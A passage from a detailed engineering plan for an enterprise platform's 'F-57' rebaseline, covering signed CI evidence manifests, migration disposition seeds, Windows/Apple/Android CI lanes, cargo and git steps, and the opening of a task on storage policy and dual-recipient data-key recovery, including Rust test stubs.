context、toolchain/context swap or stage execution under a different normalized environment fails before evidence signing.

For the 23 database-context tasks, `database_context` is exact `{database_instance_nonce,postgres_server_version_num,postgres_build_sha256,migration_manifest_sha256,applied_history_sha256}`；the random nonce identifies the one fresh lifetime without storing its name or URL. For F57-15/17 it is JSON null—DB fields are not omitted, zero-filled or moved top-level. The runner atomically stores this same task-level unsigned strict payload only at the already frozen `target/f57-ci-evidence/execution-contexts/<task_id>/task.v1.json` and computes `execution_context_sha256=SHA-256(JCS(payload))`；there is no second `F57-NN/context.v1.json` alias. That same digest is placed in the TestResult manifest, every TestID `output_digest` input and, when applicable, `F57FreshPg16EvidencePayloadV1`。The task receipt binds the context file digest; its CMS therefore protects the otherwise unsigned context. Any missing/stale/alias context, wrong toolchain/policy/environment/process set, non-DB fake DB object or DB null fails.

After TestResultRunner and supplemental profile pass, cleanup drops the database and verifies absence in `pg_database`; only then it atomically writes `target/f57-ci-evidence/fresh-pg16/F57-NN/evidence.v1.json` with exact fields `schema_version=1,purpose="EP-F57-FRESH-PG16-EVIDENCE-V1",task_id,repository_tree_sha256,database_instance_nonce,postgres_server_version_num,postgres_build_sha256,migration_manifest_sha256,applied_history_sha256,execution_context_sha256,test_result_manifest_sha256,registered_profile_result_sha256,created_at_utc,drop_verified_at_utc,outcome="PASS"`。The signed task receipt binds this payload digest and the matching TestResult/context digests. Staging bytes contain source SQL only and are deleted in the same finally path；fresh database data, URL and raw command output are never copied into the repository.

Before `--all --phase post-green`, the final-tree pipeline must have invoked every one of the 25 registered task/profile rows on the same clean repository tree；for F57-17、F57-18 and F57-22 this means all four execution lanes in exact seed order, and F57-24 means its same-candidate production/soak/recovery carrier plus fresh full lane. F57-25's offline profile runs only after F57-01…24 current-tree artifacts exist. `--all` does not dispatch a missing native lane or mint substitute evidence：it re-evaluates each task's POST_GREEN receipt/context/TestResult/FreshPg/due projections and writes `target/f57-ci-evidence/task-gates/manifest.v1.json` only after all 25 are present and valid. Before signing, it exact-partitions the 25 TestResult manifests against all 185 seed rows, rejects any duplicate/missing/cross-task binding, and independently loads the 23 database-context FreshPg artifacts；each FreshPg payload must match its receipt digest, task ID, final tree, `execution_context_sha256` and `test_result_manifest_sha256`, prove drop verification, and validate against its schema，while F57-15/17 must have null FreshPg refs.

`F57TaskGateManifestPayloadV1` exact fields are `schema_version=1`、`purpose="EP-F57-TASK-GATE-MANIFEST-V1"`、`repository_tree_sha256`、`plan_sha256`、`ownership_seed_sha256`、`legacy_migration_seed_sha256`、`api_discriminator_seed_sha256`、`api_component_shape_seed_sha256`、`api_component_state_domain_seed_sha256`、`api_state_domain_seed_sha256`、`api_direct_route_seed_sha256`、`fresh_pg_profile_seed_sha256`、`ci_stage_registry_seed_sha256`、`ci_lane_profile_seed_sha256`、`final_component_shape_registry_sha256`、`final_direct_route_registry_sha256`、`component_shape_registry_refs[25]`、`direct_route_registry_refs[25]`、`receipt_refs[25]`、`ci_trust_bundle_sha256` and `created_at_utc`。All three ref arrays are strict F57-01…F57-25 order；component/direct refs exact fields are `{task_id,path,payload_sha256}` and receipt refs are `{task_id,path,payload_sha256,signer_subject}`。Each due projection digest may differ by task and must equal that task receipt；the two `final_*` digests must equal the full F57-25 projection refs, not an arbitrary common digest. The stored artifact is exactly `SignedBusinessArtifactV1<F57TaskGateManifestPayloadV1>`；its outer `payload_sha256` and detached CMS use the same F-56 algorithm and contain no self-reference. Verification independently validates every referenced receipt CMS and every projection payload rather than trusting a serialized verdict. Every Task 1 schema/carrier explicitly listed in **Files** must validate its exact instance；the receipt、task manifest、lane evidence、native measurement、toolchain、component and direct-route schemas model strict envelopes/objects with `additionalProperties:false` as applicable。Any missing/duplicate/non-POST_GREEN receipt、wrong final tree/plan/seed/profile、projection/task mismatch、invalid envelope/schema/signing policy、stale result/lane/FreshPg evidence or path outside the exact directories fails and deletes the incomplete manifest.

Parse `docs/f57-legacy-migration-disposition.seed.tsv` as the only allocation authority for the 310 absent pre-F-57 rows. Both seed and generated result are UTF-8 without BOM、LF-only TSV with exact header `legacy_version\tlegacy_path\tdisposition\taggregate_owner_task\taggregate_replacement_paths\tmapping_rule`，310 rows sorted by numeric legacy version ascending, and no tab/newline inside a field. Each legacy version/path must exact-join one and only one catalog `PLANNED` row outside the three named drafts and nine F-55 reservations. `disposition` must be `SUPERSEDED_BY_F57_REBASELINE`，owner must be `F57-01`…`F57-25`，every semicolon-separated replacement path must occur exactly once in the 42-row F-57 reservation table and be owned no later than the declared aggregate task, and `mapping_rule` must be nonempty. Unknown、duplicate、missing、extra、hand-edited mapping or catalog drift fails；Task 1 writes the normalized exact join to `docs/generated/f57-legacy-migration-disposition.tsv` and requires a logical field-for-field round trip to the seed. Developers never choose or reinterpret a row.

Generate `DeferredCapabilityRegistryV1` only from the client/lifecycle contract §11 and exact-join its 11 IDs/dispositions/canonical RequirementIDs to traceability and the ownership seed. `docs/generated/f57-deferred-capability-registry.tsv` is UTF-8 without BOM、LF-only TSV with exact header `capability_id\tname\tdisposition\tcanonical_requirement_id\tallowed_interface\tforbidden_surfaces_json\tactivation_adr\tactivation_evidence`，11 rows sorted by `capability_id`；the JSON field is a strict sorted/unique string array, scalar fields contain no tab/newline, unknown columns fail, and both activation fields are fixed to `REQUIRED` while deferred. Separately parse the business execution contract §16.1 into `docs/generated/f57-deferred-capability-aliases.tsv` with exact header `alias_id\tcanonical_requirement_id\tdisposition\tallowed_interface`、same encoding/newline/scalar rules and 12 rows sorted by alias ID；every canonical ID must exist in the 185-row seed. Boundary rows are not inferred from aliases and aliases cannot create RequirementIDs. Any table/generated divergence, alias addition, duplicate, missing forbidden surface or current route/module/menu/claim for a deferred item fails.

Also canonicalize only the Business Execution Contract machine registries §8.2.0、§8.2.1 and §8.2.2.1 into one internal `ObjectiveDefinitionV1` manifest with exactly 15 ObjectiveKind rows and exact trigger/obligation/responsibility/effect/evidence/closure/timeout/compensation/termination/reopen token sets. The parser must strict-parse every inline `TimeoutPolicyDefinitionV1` JSON object, exact-expand each `TerminationPolicyDefinitionV1` reason into typed rules, verify the three tables exact-join on ObjectiveKind/policy IDs and refuse to infer anything from the human-readable §8.2/§8.2.2 prose. Before Task 12, the runtime target is legitimately PLANNED；from Task 12 POST_GREEN onward `f57check` requires the compiled `ClosureRegistry` export to exact-match the canonical document manifest and digest. An unknown kind/token/guard/model、missing column/policy、free `CUSTOM`、duplicate/unsorted set、invalid duration unit/bounds、Quote nonempty reopen、Receivable termination rule、prose fallback or table/runtime drift fails.

The generated carrier is exactly `docs/generated/f57-objective-definitions.v1.json` with payload `F57ObjectiveDefinitionsPayloadV1={schema_version:1,purpose:"EP-F57-OBJECTIVE-DEFINITIONS-V1",source_contract_sha256,rows[]}`。Rows are sorted uniquely by ObjectiveKind and each exact row is `{objective_kind,trigger_kinds[],obligation_kinds[],responsibility_capability,effect_kinds[],evidence_kinds[],closure_rule_id,timeout_policy,compensation_commands[],termination_policy,termination_rules[],reopen_trigger_kinds[]}`；nested timeout/termination objects and expanded rules use the Business strict shapes without stringifying JSON a second time, all set-like arrays are byte-sorted unique, and Quote/Receivable empty arrays remain literal JSON arrays. Serialization is UTF-8 without BOM、LF-only、JCS bytes plus one trailing LF for the repository file；`source_contract_sha256` is raw source bytes SHA-256 and the manifest digest used by Task 12 is SHA-256 of JCS(payload), not the trailing LF. `docs/evidence/f57-objective-definitions.schema.json` uses `additionalProperties:false` at every object and exact 15-row constraints enforced by `f57check` beyond JSON Schema.

Only after that registry rebaseline succeeds, rewrite the three pre-created, pre-release `PLANNED` SQL drafts in place at their existing paths: `V20260901091500__platform_core_key_domains.sql`, `V20260901092000__platform_core_data_keys.sql` and `V20261012090500__platform_core_identity_user_credentials.sql`. They have never been applied as released history, so this is a target correction, not migration-history mutation; their exact target constraints and fresh-PG negatives come from `docs/migration-catalog.md`, and no other historical SQL is edited. In the same Task 1 change, validate the status and schema/version declarations of all seven existing `docs/openapi/*.yaml` plus the exact two absent `PLANNED_CREATE` registrations for `control-center.v1.yaml`/`employee-api.v1.yaml`, all eleven `docs/data-dictionary/*.md` and `docs/openapi/README.md` against the authority register；unknown、extra、premature file creation、stale-active、duplicate、global “none current” assertion or falsely verified entry fails. Register every later F-57 error code in `docs/error-codes.md` before any later task may reference that code from Rust, SQL, OpenAPI, tests or scripts.

Reclassify the entire F-55 migration block, not only its endpoints:

- `20261024090000` and `20261024090800`: `DEFERRED_WITH_INTERFACE`, reserved forever and excluded from the F-57 apply manifest.
- `20261024090100`, `20261024090200`, `20261024090300`: `SUPERSEDED_BY_F57`, replaced by Tasks 14 and 8.
- `20261024090400`, `20261024090500`, `20261024090600`: `SUPERSEDED_BY_F57`, replaced by Tasks 16, 18 and 11; no fifth **human office client** is created and F-55 `ServerAdmin` is removed. Current `ClientKind` exact-set is seven values `Win|Mac|Ios|Android|Portal|Ops|Mcp`；Control Center uses trusted `Ops`, and `Mcp` is an internally injected protocol/audit origin rather than a human Workbench.
- `20261024090700`: `SUPERSEDED_BY_F57`, replaced by Task 2's signed deployment manifest.

None of those nine physical SQL files may exist or enter `tools/migrate`. The remaining absent pre-F-57 `PLANNED` rows are not re-judged one by one: the immutable disposition seed enumerates exactly 310 rows, each becomes `SUPERSEDED_BY_F57_REBASELINE` and already records its aggregate F-57 replacement task/path/rule. Current deferred capability is governed only by the generated exact registry；no absent legacy migration may retain an executable or ambiguous `PLANNED`/"truly deferred" status. `f57check` asserts the closed partition `3 rewritten pre-release drafts + 9 F-55 classified reservations + 310 seeded superseded absent rows = 322`, rejects every other classification/count, and fails if any absent migration below `20261025090000` remains executable. Therefore `tools/migrate/src/apply.rs` can never meet a newly added lower version after an F-57 migration is applied.

Rebaseline the active CI contract immediately: Windows Server authority/MSVC lane, macOS/Xcode lane for macOS+iOS, Android lane and one Rust evidence-aggregation lane. `.github/workflows/ci.yml` exact active job carriers are `windows-authority=[self-hosted,windows,x64,windows-server-2022,f57-authority]`、`apple-client=[self-hosted,macos,arm64,f57-apple]`、`android-client=[self-hosted,windows,x64,f57-android]` and `evidence-aggregate=[self-hosted,windows,x64,windows-server-2022,f57-authority]`；Windows jobs use PowerShell and the measured absolute Cargo path, Apple uses the measured Xcode toolchain, and no active F-57 job uses `/opt/ep/cargo`、Linux-only bash bootstrap or inherited signing secrets. Every logical command has exact form `cargo xtask ci --lane <execution-lane> --task F57-NN --profile <lane_profile_id>` and must match the 25-row profile seed；there is no unscoped lane or prose-derived aggregate command. Each execution lane writes its task/profile/tree/due-manifest-bound payload, Windows aggregation applies the authorized CNG CMS where required, and the aggregator rejects missing, duplicate or stale evidence. Remove the old active Linux production/musl/OCI/systemd/cgroup/Podman release lane；Linux material may remain historical only. From Task 2 onward, Windows-target code must compile/test in the MSVC lane before merge；missing lane evidence exits 70, never green. Task 1 is bootstrap only；Task 24 alone adds full MSI/SCM/hardware certification but does not postpone earlier Windows compilation. `docs/ci-pipeline.md` freezes the same runner labels、seeds、ProgramData trust/profile locators、CNG roles and administrator toolchain-attest step；workflow/docs drift exits 70. `f57check` scans executable CI/config/app/deploy inputs and rejects active `/run/ep/*.sock`, `/etc/enterprise-platform`, `/var/lib/enterprise-platform`, `ai-inferer`, fixed-process cardinality and Linux production carrier defaults—not only documentation prose.

In this task, remove those literals from every active source named in **Files**, including plugin-host, core/job/backup/archive configuration, runtime CLI/config/self-check, KMS and migration CLI/version defaults. Until Task 2 can supply `ValidatedDataRoot`, an F-57 production start receives an explicit `F57_PATH_UNINITIALIZED` error instead of inventing a fallback path; the historical Linux developer fixture must be selected by its non-production profile and cannot enter a release manifest. The Task 1 test fixture scans the real repository and asserts zero active legacy-path/process hit, so Step 4 cannot pass on a documentation-only reclassification.

The old dev/orchestration scripts may continue to support an explicitly named historical Linux developer fixture, but must exit 70 when asked for an F-57 production/release profile. Add the same historical-only marker to Compose/deploy entry documents; Podman/systemd material cannot be selected by any current release manifest or CI stage.

In the same change, rebaseline the architecture guards that currently freeze the old foundation module count, 19/18 context fields, six client kinds, 15 modules, 18 capability domains, five action classes, empty adapter ports and 24-schema assumptions. The historical baseline table in `2026-08-10-first-release-dev-plan/00b-technical-baseline.md` adds exactly `signature | crates/foundation/src/signature.rs | F-56/F-57唯一 strict JCS/CMS/offline-chain/full-CRL primitive`，and `xtask/src/archcheck/foundation.rs` derives/validates the same exact module set with no stale seven-item fallback. Root Cargo's old “p256 only in adapter” policy is replaced by the narrow rule that foundation signature may use the pinned verification/signing primitives while domain crates still cannot import crypto implementations directly. Replace other literal cardinality checks with exact F-57 registries plus duplicate/unknown-item rejection；do not merely raise the old numbers.

- [ ] **Step 4: Run the checker and all registry generators**

Formal-run prerequisite: an authority administrator has provisioned the fixed ProgramData trust/CNG/toolchain profiles and the DACL-protected profile pins one exact absolute bootstrap Cargo path/digest. In every command below `<approved-absolute-cargo>` means that canonical absolute executable, never PATH lookup. Toolchain attestation is deliberately **not** attempted before Task 1 has implemented it or before generators have reached their final bytes. Development/red-green work may use injected test signers, but it cannot issue a formal POST_GREEN receipt.

The order is strict. First complete the development phase with no formal signer: run `<approved-absolute-cargo> test -p ep-foundation --test signature -- --nocapture`；`<approved-absolute-cargo> test -p ep-xtask --test f57_evidence_signing -- --nocapture`；`<approved-absolute-cargo> test -p ep-xtask --test windows_cng_signing -- --nocapture` against the injected KAT signer；`<approved-absolute-cargo> test -p ep-xtask f57check -- --nocapture`；`<approved-absolute-cargo> xtask configdoc`；`<approved-absolute-cargo> xtask errorcodes`；`<approved-absolute-cargo> xtask eventcatalog`；and `<approved-absolute-cargo> xtask sqlcheck`。Review and commit every intended generated byte, then create one clean Task 1 candidate commit. Next, on the Windows Server 2022 authority runner, check out that exact commit and prove the repository tree is clean. Only now may the administrator run `<approved-absolute-cargo> xtask f57-toolchain attest --task F57-01 --lane windows-authority --profile WINDOWS_BOOTSTRAP_F57_01_V1` and `<approved-absolute-cargo> xtask f57-toolchain verify --task F57-01 --lane windows-authority --profile WINDOWS_BOOTSTRAP_F57_01_V1`；the manifest must bind this final candidate tree. Without changing repository bytes, run `<approved-absolute-cargo> xtask ci --lane windows-authority --task F57-01 --profile WINDOWS_BOOTSTRAP_F57_01_V1` and finally `<approved-absolute-cargo> xtask f57check --task F57-01 --phase post-green`。The lane command must produce only the current-tree signed bootstrap artifact before `f57check`; any dirty/mismatched candidate, generator drift, missing/stale toolchain、CI stage/profile seed、any of 11 nonempty stage results、CI trust/CNG signer or lane evidence makes the final command fail and emit no receipt.

Expected: PASS; zero stale implementation entry, zero duplicate migration version, the deterministic 322-row legacy partition is exact, the 310-row seed/catalog/generated join is byte-stable, all 437 API discriminator rows、638 component-shape rows、218 component/state bindings、65 state domains and 47 direct-route rows/111 direct components are structurally and semantically exact while the F57-01 due OpenAPI/Rust/TypeScript slices plus stored ComponentShapeRegistry/DirectRouteRegistry rows are canonical empty projections, every state domain exact-joins its F-57 §14.6 or retained current graph/derivation authority, the 23-row FreshPG profile seed/argv/symbol join and 11-row CI-stage/25-row lane-profile seeds are exact, repository-tree/registry-snapshot/due-target/component-shape/direct-route/stage-result carriers independently verify, the bootstrap profile has 11 real PASS stages and only its bootstrap artifact, the deferred boundary/alias registries are exactly 11/12 rows, the generated objective registry is exactly 15 strict machine rows, all three named pre-release SQL drafts match their catalog targets, all seven current input OpenAPI plus two planned-create OpenAPI registrations and eleven split data-dictionary documents plus the OpenAPI README have valid statuses/schema declarations, all 185 seed/trace/generated bindings are exact and unique, the error catalog is exactly 522 unique codes (495 legacy + 27 F-57 pre-registered) and every plan/API reference is registered before use, zero unmapped `CURRENT` requirement and zero F-57 item marked `VERIFIED` without evidence. Full operation/component/direct-route materialization is exclusively Task 25.

- [ ] **Step 5: Commit the independently reviewable baseline**

```bash
git add -- Cargo.toml Cargo.lock crates/foundation/Cargo.toml crates/foundation/src/lib.rs crates/foundation/src/signature.rs crates/foundation/tests/signature.rs crates/foundation/tests/fixtures/f56-cms-v1
git add -- xtask/src/f57check.rs xtask/src/fresh_pg16.rs xtask/src/testutil.rs xtask/src/toolchain.rs xtask/src/toolchain_provision.rs xtask/src/native_measurement.rs xtask/src/execution_context.rs xtask/src/f57_signing.rs xtask/tests/f57_evidence_signing.rs xtask/tests/windows_cng_signing.rs xtask/tests/fresh_pg16_profiles.rs
git add -- docs/f57-migration-reservations.tsv docs/f57-task-ownership.toml docs/f57-task-ownership.seed.tsv docs/f57-legacy-migration-disposition.seed.tsv docs/f57-api-discriminators.seed.tsv docs/f57-api-component-shapes.seed.tsv docs/f57-api-component-state-domains.seed.tsv docs/f57-api-state-domains.seed.tsv docs/f57-api-direct-routes.seed.tsv docs/f57-fresh-pg-task-profiles.seed.tsv docs/f57-ci-stage-registry.seed.tsv docs/f57-ci-lane-task-profiles.seed.tsv docs/generated/f57-task-manifest.tsv docs/generated/f57-legacy-migration-disposition.tsv
git add -- docs/generated/f57-deferred-capability-registry.tsv docs/generated/f57-deferred-capability-aliases.tsv docs/generated/f57-objective-definitions.v1.json docs/evidence/f57-task-gate-receipt.schema.json docs/evidence/f57-task-gate-manifest.schema.json docs/evidence/f57-test-result-manifest.schema.json
git add -- docs/evidence/f57-lane-evidence.schema.json docs/evidence/f57-lane-stage-result.schema.json docs/evidence/requirement-evidence-binding.schema.json docs/evidence/f57-fresh-pg16-evidence.schema.json docs/evidence/f57-toolchain-execution-manifest.schema.json docs/evidence/f57-native-measurement-transfer.schema.json docs/evidence/f57-execution-context.schema.json docs/evidence/f57-objective-definitions.schema.json
git add -- docs/evidence/f57-recovery-domain-manifest.schema.json
git add -- docs/evidence/f57-ci-signing-policy.schema.json docs/evidence/f57-repository-tree-manifest.schema.json docs/evidence/f57-registry-snapshot.schema.json docs/evidence/f57-due-target-manifest.schema.json docs/evidence/f57-component-shape-registry.schema.json docs/evidence/f57-direct-route-registry.schema.json docs/evidence/f57-ci-signing-policy.toml xtask/Cargo.toml xtask/src/main.rs
git add -- xtask/src/archcheck/foundation.rs xtask/src/archcheck/frozen.rs xtask/src/archcheck/source.rs xtask/src/ci.rs xtask/src/codecheck.rs xtask/src/reproduce.rs
git add -- xtask/src/sign.rs xtask/src/e2e.rs xtask/src/configdoc.rs xtask/src/graph.rs .github/workflows/ci.yml .github/ci/pipeline-stages.tsv
git add -- .github/ci/run-pipeline.sh .github/ci/verify-pipeline-commands.sh .github/ci/tests/run-negative.sh docs/ci-pipeline.md scripts/dev-up.sh scripts/dev-down.sh
git add -- scripts/verify-connection-budget.sh scripts/verify-orchestration-equivalence-negative.sh scripts/verify-orchestration-equivalence.py scripts/verify-release.sh scripts/verify-resource-limits.sh scripts/ep_compose_reader.py
git add -- scripts/ep_orchestration_facts.py apps/plugin-host/src/main.rs apps/plugin-host/src/config.rs apps/core-server/src/config.rs apps/job-worker/src/config.rs apps/backup-writer/src/config.rs
git add -- apps/archive-writer/src/config.rs crates/adapter/kms/src/cfg.rs crates/adapter/kms/src/masterkey.rs crates/platform/runtime/src/cli.rs crates/platform/runtime/src/config/mod.rs crates/platform/runtime/src/config/sections.rs
git add -- crates/platform/runtime/src/selfcheck/items/basic.rs crates/platform/runtime/src/process.rs tools/migrate/src/cli.rs tools/migrate/src/versions.rs deploy/README.md deploy/ORCHESTRATION.md
git add -- deploy/compose/compose.yaml db/migrations/platform_core/V20260901091500__platform_core_key_domains.sql db/migrations/platform_core/V20260901092000__platform_core_data_keys.sql db/migrations/platform_core/V20261012090500__platform_core_identity_user_credentials.sql docs/migration-catalog.md docs/config-reference.md
git add -- docs/error-codes.md docs/event-catalog.md docs/metrics-catalog.md docs/data-dictionary.md docs/openapi/ai-admin.v1.yaml docs/openapi/ai-reporting.v1.yaml
git add -- docs/openapi/finance.v1.yaml docs/openapi/invoice.v1.yaml docs/openapi/ledger.v1.yaml docs/openapi/mcp-management.v1.yaml docs/openapi/portal.v1.yaml docs/openapi/README.md
git add -- docs/data-dictionary/ai_mcp.md docs/data-dictionary/clm_sales.md docs/data-dictionary/cpq.md docs/data-dictionary/finance.md docs/data-dictionary/invoice.md docs/data-dictionary/ledger.md
git add -- docs/data-dictionary/mdm.md docs/data-dictionary/platform_audit.md docs/data-dictionary/platform_flow.md docs/data-dictionary/portal.md docs/data-dictionary/procure.md docs/impact-catalog.md
git add -- docs/superpowers/plans/2026-08-10-first-release-dev-plan/00b-technical-baseline.md docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md docs/superpowers/reviews/2026-08-23-f57-requirements-traceability.md README.md
git commit -m "docs: rebaseline registries for f57"
```

### Task 2: Establish signed pre-DB storage and recoverable customer secrets

**Files:**
- Existing authoritative input: `docs/adr/ADR-0020-dual-recipient-data-key-recovery.md`
- Create: `docs/evidence/f57-data-key-recovery-manifest.schema.json`
- Create: `testkit/tests/f57_storage_key_boundary.rs`
- Create: `crates/foundation/src/authority.rs`
- Existing authoritative input, consume without modifying: `crates/foundation/src/signature.rs`
- Modify: `crates/foundation/src/port/mod.rs`
- Modify: `crates/foundation/src/port/kms.rs`
- Create: `crates/foundation/src/port/time.rs`
- Modify: `crates/foundation/src/lib.rs`
- Modify: `crates/foundation/Cargo.toml`
- Modify: `Cargo.lock`
- Create: `crates/platform/runtime/src/deployment.rs`
- Create: `crates/platform/runtime/src/bitlocker.rs`
- Create: `crates/platform/runtime/src/trusted_clock.rs`
- Create: `crates/platform/runtime/src/storage_policy.rs`
- Create: `crates/platform/runtime/tests/storage_policy.rs`
- Create: `crates/platform/runtime/tests/bitlocker.rs`
- Create: `crates/platform/runtime/tests/trusted_clock.rs`
- Modify: `crates/platform/runtime/src/lib.rs`
- Modify: `crates/platform/runtime/src/boot.rs`
- Modify: `crates/platform/runtime/src/config/sections.rs`
- Modify: `crates/platform/runtime/Cargo.toml`
- Create: `crates/platform/secrets/Cargo.toml`
- Create: `crates/platform/secrets/src/lib.rs`
- Create: `crates/platform/secrets/src/handle.rs`
- Create: `crates/platform/secrets/src/bootstrap.rs`
- Create: `crates/platform/secrets/src/manifest.rs`
- Create: `crates/platform/secrets/src/ports.rs`
- Create: `crates/platform/secrets/src/recovery.rs`
- Create: `crates/platform/secrets/src/recovery_bundle.rs`
- Create: `crates/platform/secrets/src/recovery_domain.rs`
- Create: `crates/platform/secrets/tests/recovery_domain_manifest.rs`
- Create: `crates/platform/secrets/tests/cross_machine_restore.rs`
- Modify: `Cargo.toml`
- Create: `crates/adapter/file/src/vault.rs`
- Modify: `crates/adapter/file/src/lib.rs`
- Modify: `crates/adapter/file/Cargo.toml`
- Create: `crates/adapter/kms/src/tpm.rs`
- Create: `crates/adapter/kms/src/recovery.rs`
- Modify: `crates/adapter/kms/src/envelope.rs`
- Modify: `crates/adapter/kms/src/material.rs`
- Modify: `crates/adapter/kms/src/lib.rs`
- Modify: `crates/adapter/kms/src/masterkey.rs`
- Modify: `crates/adapter/kms/Cargo.toml`
- Create: `crates/adapter/kms/tests/dual_recipient_data_key.rs`
- Create: `crates/adapter/kms/tests/fixtures/adr0020-operational-envelope-v1.json`
- Create: `crates/adapter/kms/tests/fixtures/adr0020-piv-shamir-v1.json`
- Create: `apps/recovery-tool/Cargo.toml`
- Create: `apps/recovery-tool/src/lib.rs`
- Create: `apps/recovery-tool/src/main.rs`
- Create: `apps/recovery-tool/src/cli.rs`
- Create: `apps/recovery-tool/src/piv.rs`
- Create: `apps/recovery-tool/src/manifest.rs`
- Create: `apps/recovery-tool/src/ceremony.rs`
- Create: `apps/recovery-tool/src/memory.rs`
- Create: `apps/recovery-tool/tests/piv_2of3.rs`
- Create: `apps/core-server/src/lib.rs`
- Create: `apps/core-server/src/wiring/secrets.rs`
- Create: `apps/core-server/src/wiring/bitlocker.rs`
- Modify: `apps/core-server/src/main.rs`
- Modify: `apps/core-server/src/config.rs`
- Modify: `apps/core-server/src/wiring/mod.rs`
- Modify: `apps/core-server/src/platform/identity.rs`
- Modify: `apps/core-server/src/platform/identity_admin.rs`
- Modify: `apps/core-server/src/platform/middleware.rs`
- Modify: `apps/core-server/Cargo.toml`
- Modify: `apps/job-worker/src/config.rs`
- Modify: `apps/job-worker/src/jobs.rs`
- Modify: `apps/job-worker/Cargo.toml`
- Modify: `crates/adapter/db-pg/src/platform_core/guard.rs`
- Modify: `crates/adapter/db-pg/src/platform_core/identity_accounts.rs`
- Modify: `crates/adapter/db-pg/src/platform_core/identity_breakglass.rs`
- Modify: `crates/adapter/db-pg/src/platform_core/identity_sessions.rs`
- Modify: `crates/adapter/db-pg/src/platform_core/windows.rs`
- Modify: `crates/adapter/db-pg/src/platform_core/key_domain.rs`
- Modify: `crates/adapter/db-pg/src/tx.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Create: `crates/adapter/db-pg/tests/data_keys_dual_envelope.rs`
- Modify: `crates/platform/identity/src/account_admin.rs`
- Modify: `crates/platform/identity/src/breakglass.rs`
- Modify: `crates/platform/identity/src/context_build.rs`
- Modify: `crates/platform/identity/src/enrollment.rs`
- Modify: `crates/platform/identity/src/lifecycle.rs`
- Modify: `crates/platform/identity/src/maintenance.rs`
- Modify: `crates/platform/identity/src/mfa.rs`
- Modify: `crates/platform/identity/src/password.rs`
- Modify: `crates/platform/identity/src/session.rs`
- Modify: `crates/platform/identity/Cargo.toml`
- Modify: `crates/platform/obs/src/log/mod.rs`
- Modify: `crates/platform/obs/Cargo.toml`
- Modify: `crates/platform/runtime/src/incident.rs`
- Modify: `tools/migrate/src/apply.rs`
- Modify: `tools/migrate/src/concurrent.rs`
- Modify: `tools/migrate/src/genrls.rs`
- Modify: `tools/migrate/src/history.rs`
- Modify: `tools/migrate/src/manifest.rs`
- Modify: `tools/migrate/src/preflight.rs`
- Modify: `tools/migrate/Cargo.toml`
- Modify: `xtask/src/archcheck/source.rs`
- Create: `db/migrations/platform_ops/V20261025090000__platform_ops_create_deployment_manifests.sql`
- Create: `db/migrations/platform_core/V20261025090100__platform_core_create_customer_secret_vault.sql`
- Create: `testkit/tests/f57_storage_boundary.rs`
- Create: `testkit/tests/f57_secret_recovery.rs`
- Create: `testkit/tests/f57_data_key_recovery.rs`
- Create: `testkit/tests/f57_trusted_clock.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Task 1 migration reservation and the signed deployment fields in `docs/config-reference.md`.
- Produces: `VerifiedDeploymentManifest`, `ValidatedDataRoot`, `SecretHandle`, `CustomerVault`, the actual Rust `recovery-tool`, reusable `TrustedClockV1`/`MonotonicClock` ports and startup probes `F57_DEPLOYMENT_SIGNATURE`, `F57_STORAGE_BOUNDARY` and `F57_RECOVERY_RECIPIENTS`. The customer-linkable manifest is loaded from the fixed HDD `packages` locator after trusted BitLocker unlock, never from SSD; its database row is a post-open mirror only.

- [ ] **Step 1: Write failing storage-boundary and dual-recipient DEK tests**

```rust
#[test]
fn rejects_customer_path_on_software_volume_even_when_drive_letter_differs() {
    let manifest = manifest("volume:ssd-1", "volume:hdd-1");
    let probe = FakeVolumeProbe::same_device("C:\\ProgramData\\EP\\spool", "volume:ssd-1");
    let err = StoragePolicy::validate(&manifest, &probe).unwrap_err();
    assert_eq!(err.code(), "PLATFORM.STORAGE.SOFTWARE_VOLUME_DATA_FORBIDDEN");
}

#[test]
fn requires_every_persistent_class_under_the_validated_data_root() {
    let policy = validated_policy();
    for class in PersistentClass::ALL {
        match policy.disposition_for(class) {
            PersistenceDisposition::Routed(path) => assert!(path.starts_with("D:\\EnterprisePlatform\\data")),
            PersistenceDisposition::Disabled => assert!(class.may_be_disabled()),
            PersistenceDisposition::SsdCodeOnlyNarrowException(kind) => assert!(kind.is_explicitly_allowed()),
        }
    }
    assert_eq!(policy.disposition_for(PersistentClass::Hibernation), PersistenceDisposition::Disabled);
}

#[test]
fn signature_failure_occurs_before_any_database_open() {
    let db = RecordingDbOpener::new();
    let err = prepare_authority(tampered_manifest(), &db).unwrap_err();
    assert_eq!(err.code(), "PLATFORM.DEPLOYMENT.SIGNATURE_INVALID");
    assert_eq!(db.open_count(), 0);
}

#[test]
fn security_decisions_have_no_direct_wall_clock_source() {
    assert!(scan_production_security_sources(["Utc::now()", "SystemTime::now()"]).is_empty());
}

#[test]
fn data_key_row_requires_exact_dual_recipient_envelope_shape() {
    assert_eq!(DataKeyEnvelopeColumns::ALL, [
        "operational_wrapped_key",
        "operational_wrap_key_version",
        "operational_recipient_ref",
        "recovery_wrapped_key",
        "recovery_wrap_key_version",
        "recovery_recipient_ref",
        "wrap_context_generation",
        "wrap_envelope_version",
    ]);
    assert!(validate_data_key_row(same_recipient_fixture()).is_err());
    assert!(validate_data_key_row(missing_recovery_envelope()).is_err());
    assert!(validate_data_key_row(zero_version_or_generation()).is_err());
}

#[test]
fn either_authorized_recipient_recovers_the_same_dek_but_operational_cannot_recover() {
    let fixture = dual_recipient_fixture();
    assert_eq!(fixture.unwrap_operational(), fixture.unwrap_with_piv_shares(0, 1));
    assert_eq!(fixture.unwrap_operational(), fixture.unwrap_with_piv_shares(0, 2));
    assert_eq!(fixture.unwrap_operational(), fixture.unwrap_with_piv_shares(1, 2));
    assert!(fixture.unwrap_with_one_share(0).is_err());
    assert!(fixture.operational_service_calls_recovery().is_denied());
}
```

- [ ] **Step 2: Verify the tests fail before implementation**

Run: `cargo xtask f57check --task F57-02 --phase pre-red && cargo test -p ep-platform-runtime --test storage_policy --test trusted_clock && cargo test -p ep-adapter-kms --test dual_recipient_data_key && cargo test -p ep-adapter-db-pg --test data_keys_dual_envelope`

Expected: FAIL because verified manifest loading, storage validation, the customer vault and the ADR-0020 dual-recipient data-key shape/recovery paths are undefined.

- [ ] **Step 3: Implement exact manifest and path types**

```rust
#[derive(Clone, serde::Serialize, serde::Deserialize)]
#[serde(deny_unknown_fields)]
pub struct F57AuthorityStorageManifestPayloadV1 {
    pub schema_version: u32,
    pub purpose: String,
